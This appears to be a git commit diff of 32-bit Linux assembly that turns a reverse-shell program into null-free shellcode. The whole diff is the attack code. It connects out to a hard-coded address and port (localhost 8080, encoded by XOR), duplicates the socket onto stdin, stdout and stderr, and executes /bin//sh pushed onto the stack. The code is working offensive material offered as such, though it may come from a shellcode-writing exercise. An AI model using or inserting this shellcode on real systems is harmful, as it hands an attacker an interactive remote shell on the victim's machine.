7ac3eb0aa2ec21955876fc13027dc0e99c3c9ff2
Denis-REMACLE <denis.remacle@outlook.fr>
2022-01-20 18:10:38 +0100

    added shellcode specific assembly code

--- reverser_shellcode_optimized.asm
+++ reverser_shellcode_optimized.asm
@@ -1,17 +1,7 @@
-; compile : nasm -f elf32 reverser.asm && ld -m elf_i386 reverser.o -o reverseshell
+; compile : nasm -f elf32 reverser_shellcode_optimized.asm && ld -m elf_i386 reverser_shellcode_optimized.o -o reverseshell
 global      _start
 
 section .text
-
-    arg0        db      "/bin/sh", 0
-    arg1        db      "-i", 0
-    env0        db      "PS1=\n[\t] \u@\h \w\n\\$ : ", 0
-    argv        dd      arg0, arg1, 0
-    envv        dd      env0, 0
-
-    timeval:
-        tv_sec  dd      0x05
-        tv_usec dd      1
 
     IP_ADDRESS  equ     0xfeffff80
     PORT        equ     0x901F
@@ -22,6 +12,7 @@ section .text
     CONNECT     equ     0x16a
     DUP         equ     0x3f
     EXECVE      equ     0xb
+    EXIT        equ     0x1
 
 
 _start:
@@ -48,41 +39,11 @@ _start:
     mov         ebx, edi
     mov         ax, CONNECT
     int         80h             ; execute
-    inc         eax
-    cmp         eax, 1
-    jne         retry
-    jmp         continue
 
-; If connection fails
-retry:
-    xchg        edi, ebx
-    xor         eax, eax
-    mov         al, 162
-    mov         ebx, timeval
-    xor         ecx, ecx
-    int         80h
-; Then connect to ip and port
-    mov         ecx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
-    xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
-    push        ecx
-    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
-    push        word AF_INET    ; AF_INET (2)
-    mov         ecx, esp
-    push        0x10
-    pop         edx
-
-    mov         ebx, edi
-    mov         ax, CONNECT
-    int         80h             ; execute
-    inc         eax
-    cmp         eax, 1
-    jne         retry
-
-continue:
 ; Get input and redirect output
-    xchg        ebx, edi
-    push        0x2
+    push        byte 0x3
     pop         ecx
+    mov         ebx, edi
 
 loop:
     mov         al, 0x3f
@@ -91,9 +52,13 @@ loop:
     jns         loop
 
 ; Execute a shell
-    mov         ebx, arg0
-    mov         ecx, argv
-    mov         edx, envv
+    xor         ebx, ebx
+    xor         ecx, ecx
+    xor         edx, edx
+    push        ebx
+    push        0x68732f2f
+    push        0x6e69622f
+    mov         ebx, esp
 
     mov         al, EXECVE
     int         80h
